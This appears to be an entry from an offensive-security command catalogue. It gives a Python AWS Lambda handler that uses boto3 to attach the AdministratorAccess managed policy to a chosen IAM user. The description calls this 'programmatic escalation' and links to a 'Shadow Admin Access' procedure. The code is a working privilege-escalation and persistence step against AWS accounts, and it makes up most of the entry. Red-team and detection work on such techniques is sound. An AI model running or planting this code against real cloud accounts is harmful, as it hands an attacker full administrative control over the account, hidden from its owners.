---
id: 384a0162-2cba-4dfc-accd-48a8cd8a226d
name: boto3-iam-attach-user-policy-lambda
type: command
executor: python
data: |-
  import boto3
  def lambda_handler(event, context):
      client = boto3.client('iam')
      response = client.attach_user_policy(
          UserName='$_USER_NAME',
          PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
      )
      return response
output: null
created_at: '2023-04-06T03:56:09.319394+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - AWS
tags:
  - boto3
  - lambda
  - iam
verified: true
validated: true
---

# boto3-iam-attach-user-policy-lambda

## Command

```python
import boto3
def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='$_USER_NAME',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

## Description

Uses Boto3 in a Lambda function to attach an IAM policy to a user, allowing programmatic escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_USER_NAME | Target IAM user name | Yes |
| PolicyArn | ARN of the policy to attach | Yes |

## Examples

### Basic Usage

Deploy as Lambda handler and invoke.

## Expected Output

{'ResponseMetadata': {'HTTPStatusCode': 200}}

## Related

- [[procedures/AWS-Shadow-Admin-Access]]
